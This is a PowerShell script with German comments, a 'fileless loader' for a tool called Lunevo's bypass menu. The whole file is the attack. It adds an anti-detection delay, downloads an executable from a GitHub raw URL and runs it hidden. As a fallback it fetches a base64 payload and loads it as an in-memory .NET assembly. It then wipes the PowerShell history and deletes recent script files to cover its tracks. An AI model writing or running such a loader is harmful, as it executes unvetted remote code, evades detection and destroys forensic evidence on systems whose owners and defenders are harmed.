# Lunevo Fileless Loader
# Lädt und startet das Bypass-Menü vollständig fileless

# Anti-Detection: Random Delay
$delay = Get-Random -Minimum 1 -Maximum 3
Start-Sleep -Seconds $delay

# Download Bypass EXE von GitHub (fileless execution)
$exeUrl = "https://raw.githubusercontent.com/lunevo/lunevo/main/bypass.exe"
$exePath = "$env:TEMP\Lunevo\bypass_$(Get-Random).exe"

# Erstelle Verzeichnis
$exeDir = Split-Path -Parent $exePath
if (-not (Test-Path $exeDir)) {
    New-Item -ItemType Directory -Path $exeDir -Force | Out-Null
}

try {
    # Download EXE
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing -ErrorAction Stop
    
    if (Test-Path $exePath) {
        # Starte Bypass im Hintergrund
        $process = Start-Process -FilePath $exePath -WindowStyle Hidden -PassThru
        
        # Warte kurz und lösche EXE (optional - für vollständig fileless)
        Start-Sleep -Seconds 5
        # Uncomment für vollständig fileless (löscht EXE nach Start):
        # Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
    }
} catch {
    # Fallback: Base64 Payload
    $base64Url = "https://raw.githubusercontent.com/lunevo/lunevo/main/payload.b64"
    try {
        $base64 = Invoke-WebRequest -Uri $base64Url -UseBasicParsing -ErrorAction Stop
        $bytes = [Convert]::FromBase64String($base64.Content.Trim())
        
        # Load Assembly in Memory (vollständig fileless)
        $assembly = [System.Reflection.Assembly]::Load($bytes)
        $entryPoint = $assembly.EntryPoint
        if ($entryPoint) {
            $entryPoint.Invoke($null, @())
        }
    } catch {
        # Silent fail
    }
}

# Silent Log Cleaning (minimal, unauffällig)
try {
    # PowerShell History
    $historyPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath
    if ($historyPath -and (Test-Path $historyPath)) {
        Clear-Content -Path $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
    }
    
    # Temporäre PS1-Dateien (nur diese Session)
    Get-ChildItem -Path "$env:TEMP" -Filter "*.ps1" -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddMinutes(-5) } | Remove-Item -Force -ErrorAction SilentlyContinue | Out-Null
} catch {
    # Silent
}

